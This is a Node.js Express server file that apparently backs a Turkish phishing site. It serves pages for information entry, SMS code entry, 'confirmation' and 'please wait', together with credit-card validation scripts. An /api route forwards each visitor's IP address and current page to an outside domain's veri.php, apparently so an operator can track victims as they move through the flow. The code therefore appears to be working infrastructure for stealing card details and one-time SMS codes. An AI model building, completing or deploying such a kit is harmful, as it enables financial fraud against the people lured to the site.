const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;
const { readdirSync } = require("fs");

app.use(express.json());
app.use(express.static('public'));

// Import routes from the routes directory
readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));

// Define static file routes
app.get('/files/css', (req, res) => {
  res.sendFile(__dirname + '/public/files/css');
});
app.get('/bk.gif', (req, res) => {
  res.sendFile(__dirname + '/public/bk.gif');
});
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
app.get('/files/bootstrap.min.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/bootstrap.min.css');
});
app.get('/files/logo-2.png', (req, res) => {
  res.sendFile(__dirname + '/public/files/logo-2.png');
});
app.get('/bilgi.html', (req, res) => {
  res.sendFile(__dirname + '/public/bilgi.html');
});
app.get('/onay', (req, res) => {
  res.sendFile(__dirname + '/public/onay.html');
});
app.get('/files/font-awesome.min.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/font-awesome.min.css');
});
app.get('/onay.png', (req, res) => {
  res.sendFile(__dirname + '/public/onay.png');
});
app.get('/files/flaticon.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/flaticon.css');
});
app.get('/sms.html', (req, res) => {
  res.sendFile(__dirname + '/public/sms.html');
});
app.get('/bekle', (req, res) => {
  res.sendFile(__dirname + '/public/bekle.html');
});
app.get('/files/js', (req, res) => {
  res.sendFile(__dirname + '/public/files/js');
});
app.get('/img/bg-image.jpeg', (req, res) => {
  res.sendFile(__dirname + '/public/img/bg-image.jpeg');
});
app.get('/files/jquery.creditCardValidator.js.indir', (req, res) => {
  res.sendFile(__dirname + '/public/files/jquery.creditCardValidator.js.indir');
});
app.get('/files/default.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/default.css');
});
app.get('/files/creditly.js', (req, res) => {
  res.sendFile(__dirname + '/public/files/creditly.js');
});
app.get('/files/jquery-3.2.1.min.js.indir', (req, res) => {
  res.sendFile(__dirname + '/public/files/jquery-3.2.1.min.js.indir');
});
app.get('/files/style.css', (req, res) => {
  res.sendFile(__dirname + '/public/files/style.css');
});

// Proxy endpoint to handle external API requests
app.get('/api', async (req, res) => {
  try {
    const userIp = req.query.ip;
    const currentPage = req.query.current_page;

    // Construct the external API URL
    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;

    // Make a GET request to the external API
    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('Geçersiz yanıt');
    }

    res.json(response.data);
  } catch (error) {
    console.error('Hata:', error);

    // Send the error message to the client
    res.status(500).json({ error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
});
